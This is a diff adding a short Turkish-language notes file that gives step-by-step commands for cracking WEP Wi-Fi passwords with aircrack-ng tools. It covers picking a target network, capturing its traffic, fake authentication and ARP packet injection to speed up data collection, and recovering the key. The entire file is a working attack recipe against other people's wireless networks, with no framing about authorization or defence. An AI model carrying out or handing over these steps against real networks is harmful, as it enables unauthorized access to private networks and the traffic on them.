@@ -1,0 +1,20 @@
+------------WEP CRACKING------------------------------((((1))))
+1. monitor mod aktif et
+2. airodump-ng wlan0 ile etraftaki modemleri gor wep olan birini sec.
+3. airodump-ng --bssid *targetmac* --channel *chnumb* --write *randfilename01* wlan0    (agdaki bilgileri alir)
+4. new terminal
+5. aircrack-ng randfilename01.cap   NOT:(3 asamali bir sekilde(pack injection) ilerleme yapilacaksa bu asama goz ardi edilmelidir.)
+NOT: aircrackng yazdiktan sonra bir ust satirdaki olusturdugumuz dosya ismini girmeliyiz olusturulan bu dosya root icinde kayit edilir.
+NOT: Buraya kadar olan kismi isleme alirsak eger wifi sifre kirma islemi baslamistir. Lakin buraya kadarki kisimda kullanicilarin surekli bir data akisi olmalidir bizim isleme devam edebilmemiz icin.
+NOT: Sifre bulunduysa sifre icerisindeki iki noktalar silinmelidir.[a1:2b:f5:as:gg]
+-------------------------------------------------------
+
+----------PACKED INJECTION(FAKE AUTH)----------------((((2))))-Yeni Terminalde
+1. aireplay-ng --fakeauth *gonderilcek pakt sysi(0la bile kendini auth edebilirsin modeme)* -h *modemin maci* -c *kendi mac adrs* wlan0
+	NOT:association succesful derse calismistir ve calismissa airodump ekranina mac adresin eklenmelidir.
+2. aireplay-ng --arpreplay -b *modemin mac* -h *your mac* wlan0 : Bu komutla birlikte arp paketlerini direkt enjekte etmeye baslayip data sayisini arttirmaya baslayacaktir.
+NOT:airodump terminalinde gordugumuz data seviyesi biraz arttiktan sonra aircrack 3. asama olarak calistirilmali
+-----------------------------------------------------
+
+---------AIRCRACKING--------------------------------(((3)))-Yeni terminale
+aircrack-ng *randfilename01.cap*   NOT:yazilan dosya ismi 1. terminalde olusturulan dosyadir
